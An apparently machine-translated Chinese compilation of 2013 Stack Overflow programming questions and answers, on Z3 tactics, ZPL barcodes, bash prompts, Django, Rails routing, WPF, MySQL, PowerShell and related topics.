[https://yt-topic-explorer.googlecode.com/git/dist/index.html](https://yt-topic-explorer.googlecode.com/git/dist/index.html)

# z3 - 优化 z3 输入

> ID：14220826
> 
> 赞同：3
> 
> 时间：2013-01-08T17:34:36.553
> 
> 标签：z3

我正在尝试优化从我的模型生成的 z3 python 输入。我能够在具有 15k 约束（200 个状态）的模型上运行它，然后 z3 在合理的时间（<10 分钟）内停止完成。有没有办法优化从我的模型生成的约束？

3 种状态的模型：

[http://pastebin.com/EHZ1P20C](http://pastebin.com/EHZ1P20C)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-13T15:41:23.810

使用自定义策略可以提高脚本[http://pastebin.com/F5iuhN42的性能。](http://pastebin.com/F5iuhN42)Z3 允许用户定义自定义策略/求解器。[本教程](http://rise4fun.com/Z3Py/tutorial/strategies)展示了如何使用 Z3 Python API 定义策略/策略。在脚本[http://pastebin.com/F5iuhN42](http://pastebin.com/F5iuhN42)中，如果我们替换该行

```
s = Solver() 
```

和

```
s = Then('simplify', 'elim-term-ite', 'solve-eqs', 'smt').solver() 
```

运行时间将从 30 秒减少到 1 秒（在我的机器上）。

该过程`Then`正在创建由 4 个步骤组成的策略/策略：

*   简化器（即，应用规则的重写器，例如`x + 1 - x + y`==>`1 + y`

*   消除`If(a, b, c)`where`b`和`c`not Boolean 形式的表达式。脚本大量使用了这种表达方式。该策略`elim-term-ite`将应用消除这种表达的转换。

*   方程求解器。它应用了诸如`x = a And F[x]`==>之类的转换`F[a]`。在上面的脚本中，这种策略可以消除 1000 多个变量。

*   该策略`smt`调用 Z3 中的通用 SMT 求解器。

该方法将 Z3 战术/策略转换为提供和方法`.solver()`的求解器对象。我在消息开头包含的教程有更多详细信息。`add``check`

# observable - 谁能解释 Ayende 的 CompositeObservable 解决方案？

> ID：14220827
> 
> 赞同：1
> 
> 时间：2013-01-08T17:34:37.623
> 
> 标签：observable

根据“ [Ayende 对事实的实现](http://ayende.com/blog/4113/conditions-and-facts)”，他指出如果条件基于多个可观察的，则解决方案是`CompositeObservable`.

任何人都可以根据 Ayende 的定义向我解释或展示 CompositeObservable 的示例吗？

# label - ZPL - 条形码打印时缺少数字

> ID：14220832
> 
> 赞同：6
> 
> 时间：2013-01-08T17:35:08.587
> 
> 标签：label, barcode, zebra-printers, zpl, barcode-printing

我正在尝试使用以下 ZPL 和 Zebra ZP 450 打印机在标签上打印 Code 128 条形码：

```
^BY3^BCN,112,N^FO090,660^FD>;>89102100^FS 
```

我希望条形码扫描为“9102100”。但是，当我扫描打印的条形码时，它显示为“910210”——截去最后一个数字。

如果我更改最后一位数字，它仍然会被切断。但是，如果我在末尾添加更多数字，例如“9102100357”，则条形码正确读取为“9102100357”。

为什么在这种特殊情况下我“丢失”了一个数字？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-01-09T14:15:38.363

块的`>;`内部`^FD`告诉代码 128 条码进入一个子集（在本例中为子集 C），它强制条码中的数据为数字对 (00 - 99)。任何未以数字对形式提供的数据都将被忽略。如果你把一个字母放在那里，它会忽略那对。在你的情况下`9102100`有奇数个数字，所以它忽略最后一个。例如，如果您添加另一个`0`，它将把所有字母放在条形码中。

将`;>`条码放在子集 C 中的不是默认设置。子集 B 或是`:>`默认值，它将允许在条形码中编码任何字符。因此，您可以将 替换为`;>`，`:>`或者完全删除`;>`，它会正确打印出来。

查看`^BC`ZPL 编程手册中的文档以获取有关 Code 128 子集和数据验证的更多信息

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-01-06T04:34:05.633

[请参阅ZPL 编程指南](https://www.zebra.com/content/dam/zebra/manuals/printers/common/programming/zpl-zbi2-pm-en.pdf#page=92)的第 92 页。

此问题可能已在固件更新中修复，请参见下文：

> 示例：这是一个将 mode 参数设置为 D* 的示例：
> 
> ```
> ^XA
> ^PON
> ^LH0,0
> ^BY2,2.5,145
> ^FO218,343
> ^BCB,,Y,N,N,D
> ^FD(91)0005886>8(10)0000410549>8(99)05^FS
> ^XZ 
> ```
> 
> D* — 尝试打印具有奇数个字符的最后一个应用程序标识符时，使用模式 D 打印 EAN128 条码时存在问题。该问题已在固件版本 V60.13.0.6 中得到修复。

# logging - Azure 网站和企业库日志记录

> ID：14220834
> 
> 赞同：1
> 
> 时间：2013-01-08T17:35:14.233
> 
> 标签：logging, azure, enterprise-library

我正在将现有的 ASP.NET 网站迁移到 Azure 网站（不是云服务）。该网站使用 EL 进行日志记录和异常处理。问题是通过 FTP 打开 Azure 文件夹时看不到我的 trace.log 文件。

在 IIS 中，我必须为该文件夹设置正确的权限。但是对于 Azure，我没有这个选项。

有人使用日志记录到 Azure 网站上的文件吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:36:48.947

考虑将您的跟踪保存到 SQL Azure 数据库或实现将它们保存到存储的跟踪提供程序。我不相信您可以将 Azure 网站上的文件系统用于除部署之外的任何用途

# macos - 终端 PS1 中的断线修复

> ID：14220848
> 
> 赞同：13
> 
> 时间：2013-01-08T17:36:03.900
> 
> 标签：macos, terminal, ps1

我有这个代码来为我的终端着色：

```
export PS1="\e[1;30m\][\e[\e[1;30m\]\e[1;33m\] \u@\H \[\e[1;32m\]\w\[\e[0m\] \e[1;30m\]]\n[\[ \e[1;31m\]\T\[\e[0m\]\e[1;30m\] ] > \e[37m\]" 
```

但是我有一个问题，当文本应该在新行中时，它会覆盖第一行。

例子：
[![](../Images/43626c68b3a4a1cc53f8b0023839809f.png)](https://dzwonsemrish7.cloudfront.net/items/3L342k3F3T321l0a2C34/Screen%20Shot%202013-01-08%20at%205.34.36%20PM.png?v=4bf6bc1a)

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-01-08T23:16:57.517

为了让 bash 确定您的提示占用了多少屏幕空间（以及因此实际命令行开始的位置），您必须将提示的非打印部分包含在`\[...\]`. 大多数情况下，这意味着转义序列`\e[1;30m`需要写成`\[\e[1;30m\]`. 您的提示中有一些`\[`' 和`\]`'，但它们位于错误的位置，这让 bash 非常困惑。找到与您一样复杂的提示的所有打印和非打印部分并非易事，但我认为这是正确的：

```
export PS1='\[\e[1;30m[\e[\e[1;30m\e[1;33m\] \u@\H \[\e[1;32m\]\w\[\e[0m\] \[\e[1;30m\]]\n[ \[\e[1;31m\]\T\[\e[0m\e[1;30m\] ] > \[\e[37m\]' 
```

# javascript - 根据本地月份和日期重定向 Index.html 页面

> ID：14220850
> 
> 赞同：0
> 
> 时间：2013-01-08T17:36:06.410
> 
> 标签：javascript

我的网站“skytamer.com”目前有我每天晚上手动加载的 index.html 页面的 366 个版本。366版本存放在以下目录中：

www.skytamer.com/date/0101.html。

这 366 个文件分别表示为 0101.html（1 月 1 日）、0601.html（6 月 1 日）等，一年中的每一天都有一个。

我需要一个脚本，该脚本将根据计算机的本地月份和日期的时间戳自动重定向 index.html 页面。

例如，地球不断转动，6 月 6 日来临。然后“index.html”页面应该加载“www.skytamer.com/date/0601.html”作为新的“index.html”页面。

这可以做到吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:47:16.780

剧本：

```
function getPageToday() {
var today = new Date();
var day = String(today.getDate());
var month = String(today.getMonth() + 1);
if (day.length === 1) {
    day = '0' + day;
}
if (month.length === 1) {
    month = '0' + month;
}
var page = month + day + '.html';
return page; 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:38:14.397

`<meta http-equiv="refresh" content="5;URL='http://example.com/'">`结合一个检查日期的简单脚本。

请记住，时区存在，因此如果您有可用的服务器端脚本，您可能希望从服务器获取时间。

# python - Django 与内置“用户”模型的多对多关系

> ID：14220852
> 
> 赞同：8
> 
> 时间：2013-01-08T17:36:19.787
> 
> 标签：python, django, many-to-many

## 设想

我有一个基本的 Django 应用程序，其中用户（django 的身份验证内置模型）和报告具有多对多关系。

## 问题

Django 不会创建相应的表来处理这种关系。我的应用程序称为`reports`. 尝试创建`report`和分配用户时，管理系统出现错误。它尝试查询该表`reports_report_users`，但由于它不存在而失败。

## 模型.py 代码

```
 from django.db import models
 from django.contrib.auth.models import User
 class Report(models.Model):
     name = models.CharField(max_length=30, blank=False)
     users = models.ManyToManyField(User, related_name='reports')
     def __unicode__(self):
         return self.name 
```

## 尝试的解决方案

1.  使用此链接作为参考：[https ://docs.djangoproject.com/en/1.4/topics/db/examples/many_to_many/](https://docs.djangoproject.com/en/1.4/topics/db/examples/many_to_many/)
2.  跑`manage.py syncdb`了大约 300 次 - 好的，只有一次，但是没有错误，并且在检查 SQLite db 时没有创建额外的表:(

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T18:27:43.997

在第一次同步后，您似乎已添加到报告模型中。因此，您正在处理迁移，而 django 本身并不这样做。

首先，检查 sql 输出，确保存在多对多关系的 create table 指令。

```
python manage.py sqlall 
```

假设问题是这是一个迁移，django 不能本地处理，你有三个选择：1）删除这个应用程序的所有数据库表，然后再次运行 syncdb。2) 手动创建表（从 sqlall 命令复制粘贴 create sql 相当容易） 3) 开始使用像 South 这样的迁移框架。

从长远来看，你会欣赏在南方学习的投资。短期来看，删除DB文件是最快的。-

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T18:04:08.527

您是否删除了 db 文件并再次运行 manage.py syncdb？

# web-services - AWS弹性beantalk无法使用resteasy返回自定义响应代码？

> ID：14220853
> 
> 赞同：1
> 
> 时间：2013-01-08T17:36:19.997
> 
> 标签：web-services, amazon-web-services, resteasy, amazon-elastic-beanstalk

我正在使用 RESTEASY 开发 Web 服务，以在遇到异常时设置响应状态代码。首先，我尝试了在本地运行良好的 resteasy 异常映射器。下面附上映射器代码。但是，当我将该 WS 上传到弹性 beantalk 时，总是返回 500（内部服务器错误）。

```
@Provider
public class LoadGridTileFailedExceptionMapper extends BaseExceptionMapper implements ExceptionMapper<LoadGridTileFailedException>
{
@Override
public Response toResponse(LoadGridTileFailedException e)
{
    log(e.getMessage(), e);
    return printMsg(e.getMessage(), DtmWebServiceReturnStatus.LOAD_GRID_TILE_FAILED_EXCEPTION_CODE);
}
} 
```

然后我尝试抛出异常 WebApplicationException(ex, DtmWebServiceReturnStatus.LOAD_GRID_TILE_FAILED_EXCEPTION_CODE) 来绕过异常映射。结果是我得到了响应状态 498(LOAD_GRID_TILE_FAILED_EXCEPTION_CODE) 包裹在状态代码 500 中。

Apache Tomcat/7.0.27 - 错误报告

# HTTP 状态 498 -

**类型**状态报告

**信息**

**说明**http.498

### Apache Tomcat/7.0.27

似乎弹性 beanstalk 包装了服务器端抛出的所有异常，状态码为 500？问题是如何绕过该功能并返回我设置的状态码作为响应？谢谢你。

* * *

## 更新

今天早上尝试更多请求，发现一些有趣的东西：

## 在弹性 beantalk 日志快照中获取正确的返回状态

## /var/log/tomcat7/localhost_access_log.txt

127.0.0.1 - - [09/Jan/2013:15:06:28 +0000] “GET /published/tile/003331330031 HTTP/1.1”498 22 127.0.0.1 - - [09/Jan/2013:15:06: 31 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 127.0.0.1 - - [09/Jan/2013:15:06:34 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 127.0.0.1 - - [09/Jan/2013:15:06:37 +0000] “GET /published/tile/003331330031 HTTP/1.1”498 22 127.0.0.1 - - [09/Jan/2013:15: 06:39 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 127.0.0.1 - - [09/Jan/2013:15:06:41 +0000] "GET /published/tile/003331330031 HTTP/ 1.1" 498 22 127.0.0.1 - - [09/Jan/2013:15:06:44 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 127.0.0.1 - - [09/Jan/2013: 15:06:48 +0000]“GET /published/tile/003331330031 HTTP/1.1”498 22 127.0.0.1 - - [2013 年 1 月 9 日：15:06:51 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 127.0.0.1 - - [09/Jan/2013:15:06:54 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 127.0.0.1 - - [09/Jan/2013:15:06:57 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22

* * *

## /var/log/httpd/elasticbeanstalk-access_log

10.28.215.233 (65.167.11.254, 10.28.215.233) - - [09/Jan/2013:15:06:28 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 "-" "-" 10.28 .215.233 (65.167.11.254, 10.28.215.233) - - [09/Jan/2013:15:06:31 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 "-" "-" 10.28。 215.233 (65.167.11.254, 10.28.215.233) - - [09/Jan/2013:15:06:34 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 "-" "-" 10.28.215.233 (65.167.11.254, 10.28.215.233) - - [09/Jan/2013:15:06:37 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 "-" "-" 10.28.215.233 ( 65.167.11.254, 10.28.215.233) - - [09/Jan/2013:15:06:39 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 "-" "-" 10.28.215.233 (65.167 .11.254, 10.28.215.233) - - [09/Jan/2013:15:06:41 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 "-" "-" 10.28.215.233 (65.167.11.254 , 10.28.215.233) - - [09/Jan/2013:15:06:44 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 "-" "-" 10.28.215.233 (65.167.11.254, 10.28.215.233) - - [09/Jan/2013:15:06:48 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 "-" "-" 10.28.215.233 (65.167.11.254, 10.28 .215.233) - - [09/Jan/2013:15:06:51 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 "-" "-" 10.28.215.233 (65.167.11.254, 10.28\. 215.233) - - [09/Jan/2013:15:06:54 +0000] "GET /published/tile/003331330031 HTTP/1.1" 498 22 "-" "-" 10.28.215.233 (65.167.11.254, 10.28.215 .233) - - [09/Jan/2013:15:06:57 +0000]“GET /published/tile/003331330031 HTTP/1.1”498 22“-”“-”

## 但是在客户端，仍然有 500 :-(

## printMsg 方法：

```
protected Response printMsg(String msg, int intStatus)
{
    // Need this due to the Resteasy bug
    ServiceDataCollector.processRequest(true);

    ResponseBuilder builder = Response.status(intStatus);
    builder.type("text/plain");
    builder.entity("ERROR: " + msg);
    Response rep = builder.build();
    LOG.error(rep.getStatus() + ":" + rep.toString());
    return rep;
} 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-01-12T21:28:30.253

有人帮我解决问题。我将 httpd 部署在我的 AMI 中，然后是 80 的 tomcat 服务器。因此负载均衡器将与 httpd 服务器交互，从而将状态代码从 tomcat 更改为 500。禁用该 httpd 服务器将解决问题。谢谢大家的帮助。

# c# - 为什么我的图像在设计时而不是在运行时显示？

> ID：14220856
> 
> 赞同：4
> 
> 时间：2013-01-08T17:36:29.347
> 
> 标签：c#, wpf, wpf-controls

我有一个 WPF `<Image>`，我试图用下面的代码在 a 的`<Button>`内部显示。`<Toolbar>`

```
<ToolBarTray>
    <ToolBar Height="26" Name="toolBar1" VerticalAlignment="Top" >
        <Button Name="StampButton" Click="StampButton_Click">
            <Image Source="/MyApp.Resources;component/Resources/MyImage.png" 
            Height="16" Width="16" Stretch="Fill"/>
        </Button>
    </ToolBar>
</ToolBarTray> 
```

图像在设计时显示得很好。但是，在运行时不会显示任何内容。资源位于另一个名为`MyApp.Resources`. 该按钮实际上创建得很好，点击事件也可以正常工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T18:54:31.370

将您的图像构建操作设置为“资源”。尝试使用完整的源路径。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-21T08:43:13.907

我遇到了同样的问题 - 在设计时显示图像，但在运行时不显示。我已经将操作设置为资源，尝试了不同的包 uris 等，但解决方案很简单

```
<Window.Resources>
    <BitmapImage x:Key="your_image_key" UriSource="your_image.png" />
    <Image Source="{StaticResource your_image_key}"/>
</Window.Resources> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-04-27T16:45:33.393

这对我有用，来自一个名为 wpf-tutorial.com 的网站：

`<Image Source="/WpfTutorialSamples;component/Images/copy.png" />`

在我的例子中，图像是项目文件夹的子文件夹，我也假设在这个示例中。

# php - PHP 将 UnUnicode 字符转换为 Unicode（完整）

> ID：14220857
> 
> 赞同：1
> 
> 时间：2013-01-08T17:36:31.050
> 
> 标签：php, unicode, special-characters

我一直在尝试将一些特殊和 ununicode 字符转换为原始字符，但我没有得到我需要的。
让我们举个例子。我有一个波斯名称的文件，我想上传它。当我上传它时，名称会更改为一些奇怪的字符，例如 Ø ！我不知道为什么（我也不想知道），但是当我开始用 IDM 下载它时，奇怪的名字又变回了原来的名字。

原始文件名： ترمینال_نبدکاووس.rar
奇怪的文件名： ØªØ±Ù…ÛŒÙ†Ø§Ù„_Ú¯Ù†Ø¨Ø¯Ú©Ø§ÙˆÙˆ³.rar

这不仅仅是我的问题。每种语言的文件名都会转换为自己的奇怪字符。在另一个示例中，当我想将巴比伦词典 (bgl) 转换为 stardict (mdx) 格式时，语音会再次转换为奇怪的字符。

我想知道有没有一种绝对的方法可以使用 PHP 将所有这些字符转换回其原始字符???????

# mysql - MySQL合并表重复

> ID：14220859
> 
> 赞同：1
> 
> 时间：2013-01-08T17:36:36.760
> 
> 标签：mysql, merge, duplicates

这是我目前拥有的：

存档表（2008-2011 年每年一个）和 2012 年新创建的 4 个表，按季度划分。所有这些表，包括新表，都具有相同的结构和键。这些的命名约定是 ARCHIVE_PLAYS。然后我有一个用于当前数据的“实时”表（称为 PLAYS）。我有一个合并表，它结合了所有表，以便我可以运行报告。我以前没有的问题是这个合并表显示重复。它们具有相同的主键，所以不应该是这种情况，对吧？它必须与我刚刚创建的新表有关，因为我以前没有这个问题。

结构：

```
**COMPANY**
      COMPANY.MERGED_PLAYS
      COMPANY.ARCHIVE_PLAYS_2008
      COMPANY.ARCHIVE_PLAYS_2009
      COMPANY.ARCHIVE_PLAYS_2010
      COMPANY.ARCHIVE_PLAYS_2011
      COMPANY.ARCHIVE_PLAYS_2012Q1
      COMPANY.ARCHIVE_PLAYS_2012Q2
      COMPANY.ARCHIVE_PLAYS_2012Q3
      COMPANY.ARCHIVE_PLAYS_2012Q4

**COMPANY2**
      COMPANY2.PLAYS 
```

除 Merged_Plays 外，每个表都有以下 Create：

```
CREATE TABLE `ARCHIVE_PLAYS_2011` (
`ENTRY_ID` BIGINT(20) NOT NULL,
`NODE_ID` VARCHAR(48) NOT NULL,
`HW_ID` VARBINARY(64) NOT NULL,
`LOG_DAY` DATE NOT NULL,
`ROW_NUMBER` INT(11) NOT NULL,
`NODE_NAME` VARCHAR(128) NOT NULL,
`FILE_NAME` VARCHAR(1024) NOT NULL,
`PRESENTATION_NAME` VARCHAR(1024) NULL DEFAULT NULL,
`SMIL_SEQUENCE_ID` VARCHAR(256) NULL DEFAULT NULL,
`SMIL_CONTENT_ID` VARCHAR(256) NULL DEFAULT NULL,
`PLAY_TIME_MS` BIGINT(20) NOT NULL,
`PLAY_TIME` TIME NOT NULL,
`STATUS_CODE` VARCHAR(48) NULL DEFAULT NULL,
`NUM_SCREENS_CONNECTED_AND_ON` INT(11) NULL DEFAULT NULL,
`NUM_SPEAKERS_CONNECTED_AND_ON` INT(11) NULL DEFAULT NULL,
`SCREEN_LAYOUT_MATCHES` CHAR(1) NULL DEFAULT NULL,
`ENTRY_PROCESSED` CHAR(1) NULL DEFAULT NULL,
`FILE_PATH` VARCHAR(1024) NULL DEFAULT NULL,
PRIMARY KEY (`NODE_ID`, `LOG_DAY`, `ROW_NUMBER`),
INDEX `PLAYLOG_ENTRY_ID` (`ENTRY_ID`),
INDEX `PLAYLOG_LOG_DAY` (`LOG_DAY`),
INDEX `PLAYLOG_LOG_DAY_PLAY_TIME` (`LOG_DAY`, `PLAY_TIME`),
INDEX `PLAYLOG_FILE_NAME` (`FILE_NAME`(600)),
INDEX `PLAYLOG_NODE_NAME` (`NODE_NAME`),
INDEX `PLAYLOG_FILE_NAME_NODE_NAME` (`FILE_NAME`(600), `NODE_NAME`),
INDEX `PLAYLOG_ENTRY_ID_PROCESSED` (`ENTRY_ID`, `ENTRY_PROCESSED`)
  )
    COLLATE='latin1_swedish_ci'
    ENGINE=MyISAM; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T18:33:07.697

主键仅确保单个表中的唯一数据。您必须有跨多个表的重复记录。确保您已从实时表中删除了所有 2012 年的数据。确保任何四分之一桌之间没有重复。

此外，如果记录是 100% 重复，如果您在所有表之间执行 UNION（而不是 UNION ALL），您将获得唯一的结果，但这会降低查询性能。

# ruby-on-rails - Rails：渲染 AJAX 部分时出现路由错误

> ID：14220870
> 
> 赞同：3
> 
> 时间：2013-01-08T17:37:31.343
> 
> 标签：ruby-on-rails, ruby-on-rails-3, jquery

当我尝试在 ajax 调用中渲染部分时遇到路由错误：

```
Routing Error

No route matches {:action=>"destroy", :controller=>"relationships", :user_id=>#<User id: 2, username: ..... 
```

在我的应用程序中，我的个人资料页面上显示了一个用户的关注者列表。我不想对关注者进行分页，而是尝试通过 AJAX 从服务器返回关注者的下一个偏移量。我的视图已经使用部分显示这些关注者的列表（限制为 5 条记录）。

我的目标是使用 AJAX 调用返回此部分，并格式化记录的下一个偏移量（我还没有实现返回偏移量记录的功能 - 我只是想让 ajax 先工作）。当我在浏览器中访问个人资料页面（并查看前 5 条记录）时，部分工作正常，当我进行 AJAX 调用时发生错误。

这是 ajax 调用发起的视图中的表单：

```
<%= form_tag user_relationships_path(@user), method: :get, remote: true do %>
    <%= submit_tag 'load more...' %>
<% end %> 
```

这是路线：

```
resources :users, only: [:index, :show, :new, :create, :edit, :update, :destroy] do
  resources :relationships, only: [:create, :destroy, :index]
end 
```

`relationships#index`这是响应请求的控制器操作 ( )：

```
def index
  @user = User.find_by_username(params[:user_id])
    respond_to do |format|
      format.js { render 'load_followers' }
  end
end 
```

load_followers.js.erb 部分：

```
$('ul#followers').append("<%= render 'users/following_items', users: @user.followers %>") 
```

users/following_items.html.erb 部分：

```
<% users.each do |user| %>
<li class="clearfix">
    <div class="box-gravatar pull-left">
       <%= link_to user do %>
       <%= gravatar_for user, 40 %>
       <% end %>
    </div>
    <div class="pull-right">
       <%= render 'relationships/follow', user: user %>
    </div>
    <%= link_to user.username, user %>
    <div class="box-author">joined <%= join_date_for user %></div>
</li>
<% end %> 
```

最后是关系/follow.html.erb 部分：

```
<% unless current_user?(user) %>
   <% if current_user.following? user %>
      <p><%= link_to 'unfollow', user_relationship_path(user), method: :delete, class: "btn" %></p>
   <% else %>
      <p><%= link_to 'follow', user_relationships_path(user), method: :post, class: "btn btn-primary" %></p>
   <% end %>
<% end %> 
```

我已经将违规代码追踪到了关系/follow.html.erb 部分。当它被删除时，ajax 调用工作正常，并且部分被附加到`ul`. 显然，这与 rails`link_to`的`relationships#destroy`方法有问题有关 - 但是，我尝试过的任何方法似乎都不起作用。

编辑：这是运行的结果`rake routes`：

```
root        /                                                posts#index
            posts_test        /posts/test(.:format)                            posts#test
                submit        /submit(.:format)                                posts#new
                signup        /signup(.:format)                                users#new
                 login        /login(.:format)                                 sessions#new
                logout DELETE /logout(.:format)                                sessions#destroy
                 about        /about(.:format)                                 about#index
                search        /search(.:format)                                search#index
              sessions POST   /sessions(.:format)                              sessions#create
           new_session GET    /sessions/new(.:format)                          sessions#new
               session DELETE /sessions/:id(.:format)                          sessions#destroy
         post_comments POST   /posts/:post_id/comments(.:format)               comments#create
            post_votes POST   /posts/:post_id/votes(.:format)                  votes#create
                 posts GET    /posts(.:format)                                 posts#index
                       POST   /posts(.:format)                                 posts#create
              new_post GET    /posts/new(.:format)                             posts#new
                  post GET    /posts/:id(.:format)                             posts#show
    user_relationships GET    /users/:user_id/relationships(.:format)          relationships#index
                       POST   /users/:user_id/relationships(.:format)          relationships#create
 new_user_relationship GET    /users/:user_id/relationships/new(.:format)      relationships#new
edit_user_relationship GET    /users/:user_id/relationships/:id/edit(.:format) relationships#edit
     user_relationship GET    /users/:user_id/relationships/:id(.:format)      relationships#show
                       PUT    /users/:user_id/relationships/:id(.:format)      relationships#update
                       DELETE /users/:user_id/relationships/:id(.:format)      relationships#destroy
                 users GET    /users(.:format)                                 users#index
                       POST   /users(.:format)                                 users#create
              new_user GET    /users/new(.:format)                             users#new
             edit_user GET    /users/:id/edit(.:format)                        users#edit
                  user GET    /users/:id(.:format)                             users#show
                       PUT    /users/:id(.:format)                             users#update
                       DELETE /users/:id(.:format)                             users#destroy
            categories GET    /categories(.:format)                            categories#index
                       POST   /categories(.:format)                            categories#create
          new_category GET    /categories/new(.:format)                        categories#new
              category GET    /categories/:id(.:format)                        categories#show
                              /:category(.:format)                             posts#index 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T18:02:12.057

注意您的 rake 路由输出了这一行：

```
DELETE /users/:user_id/relationships/:id(.:format) 
```

这意味着您的命名路由 user_relationship 需要`user`和`relationship`ID。原因是，`relationship`是的嵌套资源`user`。

因此，例如，您当前的链接中有这个：

```
= link_to 'unfollow', user_relationship_path(user), method: :delete, class: "btn" 
```

相反，它应该是这样的：

```
= link_to 'unfollow', user_relationship_path(user, relationship), method: :delete, class: "btn" 
```

# android - 安卓解锁图案

> ID：14220871
> 
> 赞同：0
> 
> 时间：2013-01-08T17:37:32.580
> 
> 标签：android, design-patterns, locking

我想知道有没有什么方法可以找到在 android 的图案解锁中制作了什么图案。

我的意思是我想知道用户在尝试解锁手机时做了什么模式。

当手机解锁时，有广播接收器会通知你.....但我想知道每次用户尝试正确或错误地解锁时是否有任何方法知道模式。

是否有任何接收器在每个解锁模式时通知应用程序？

谢谢..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:41:02.467

值得庆幸的是，这是不可能的——这将代表一个重大的安全漏洞。想象一下记录用于解锁 iDevice 的密码......

坦率地说，我也看不到这种功能的任何有益用途。我原以为这些东西被严格用于恶意目的。你为什么会对这些数据感兴趣？

# python - Python If 语句

> ID：14220873
> 
> 赞同：-2
> 
> 时间：2013-01-08T17:37:35.923
> 
> 标签：python

在我的 python 程序中，有时在我的 if 语句中只有最上面的一个有效

这是我的程序 [http://ubuntuone.com/0u2NxROueIm9oLW9uQVXra](http://ubuntuone.com/0u2NxROueIm9oLW9uQVXra)

当你运行程序时，如果你去东西南北，然后它不起作用，问题出在功能室4（）中：

```
def room4():
    """Forest go south to small town room 1 and east to forest path room8"""
    room = 4
    print "Forest you can go south to small town, east to forest path, or continue to explore the forest"
    cmd = raw_input('> ') 
    cmd = cmd.lower()
    if cmd == "e" or cmd == "east" or "go east":
        print room8()
    if cmd == "s" or cmd == "south" or "go south":
        print room1()
    if cmd == "forest" or cmd == "explore" or cmd == "explore forest" or cmd == "explore the forest":
        print room13()
    else:
        print error()
        print room4() 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-08T17:41:14.593

将来，请包含您问题中的相关代码。我认为您指的是以下内容：

```
if cmd == "e" or cmd == "east" or "go east":
    print room8()
if cmd == "s" or cmd == "south" or "go south":
    print room1()
if cmd == "forest" or cmd == "explore" or cmd == "explore forest" or cmd == "explore the forest":
    print room13()
else:
    print error()
    print room4() 
```

您将始终输入第一个`if`语句的原因是您有`or "go east"`而不是`or cmd == "go east"`. 布尔上下文（如语句）中的字符串`if`评估为真。

而不是`if cmd == "e" or cmd == "east" or cmd == "go east"`，您可以使用以下内容：

```
if cmd in {"e", "east", "go east"}:
    ... 
```

如果您在 Python 2.6 或更低版本中不存在集合文字，请不要`{"e", "east", "go east"}`使用`set(("e", "east", "go east"))`.

# powershell - 比较 2 个文件夹并将路径保存到变量中？

> ID：14220874
> 
> 赞同：1
> 
> 时间：2013-01-08T17:37:39.123
> 
> 标签：powershell, compare, get-childitem

我的任务是比较 2 个文件夹，FolderA 和 FolderB，并注意 A 中存在但 B 中不存在的任何文件。

很抱歉没有完全解释自己。如果我解释一下我们的情况，也许会有所帮助。公司销售人员离开我们公司去竞争对手那里。他的工作笔记本电脑本地硬盘上有文件。我们正在尝试确定他的计算机上是否存在任何文件，但共享网络文件夹中没有。

我需要生成他的笔记本电脑上存在但不在共享网络位置上的所有文件（及其路径）的列表。笔记本电脑本地硬盘和共享网络位置之间的文件结构不同。解决这个问题的最佳方法是什么？

```
$folderAcontent = "C:\temp\test1" 
$folderBcontent = "C:\temp\test2"

$FolderAContents = Get-ChildItem $folderAcontent -Recurse | where-object {!$_.PSIsContainer}
$FolderBContents = Get-ChildItem $folderBcontent -Recurse | where-object {!$_.PSIsContainer}

$FolderList = Compare-Object -ReferenceObject ($FolderAContents ) -DifferenceObject ($FolderBContents) -Property name
$FolderList | fl * 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-08T19:14:48.540

使用 compare-Object cmdlet：

```
Compare-Object (gci $folderAcontent) (gci $folderBcontent) 
```

如果要列出仅在 $folderAcontent 中的文件，请使用 <= SideIndicator 选择结果：

```
Compare-Object (gci $folderAcontent) (gci $folderBcontent) | where {$_.SideIndicator -eq "<="} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-08T18:26:51.017

假设两个目录中的文件名相同，您可以执行以下操作：-

```
$folderAcontent = "C:\temp\test1"  
$folderBcontent = "C:\temp\test2"

ForEach($File in Get-ChildItem -Recurse -LiteralPath $FolderA | where {$_.psIsContainer -eq $false} | Select-Object Name)
{
   if(!(Test-Path "$folderBcontent\$File"))
{
   write-host "Missing File: $folderBcontent\$File"
}
} 
```

以上仅适用于文件夹 A 中的文件（而非子目录）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-08T18:56:18.437

尝试：

```
#Set locations
$laptopfolder = "c:\test1"
$serverfolder = "c:\test2"

#Get contents
